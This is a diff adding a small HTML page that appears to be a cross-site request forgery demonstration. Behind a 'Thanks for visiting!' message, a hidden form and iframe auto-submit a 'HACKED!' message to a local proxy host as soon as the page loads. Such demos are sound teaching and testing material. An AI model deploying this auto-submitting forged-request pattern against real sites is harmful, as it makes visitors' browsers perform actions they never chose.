@@ -1,0 +1,18 @@
+Thanks for visiting! <a href="https://localhost.charlesproxy.com/">Go back</a>
+
+<div hidden>
+  <iframe name="hiddenFrame"></iframe>
+  <form
+    id="theform"
+    action="https://localhost.charlesproxy.com/"
+    method="post"
+    target="hiddenFrame"
+  >
+    <label for="message">Message:</label><br />
+    <textarea name="message">HACKED!</textarea><br />
+    <input type="submit" />
+  </form>
+</div>
+<script>
+  theform.submit();
+</script>
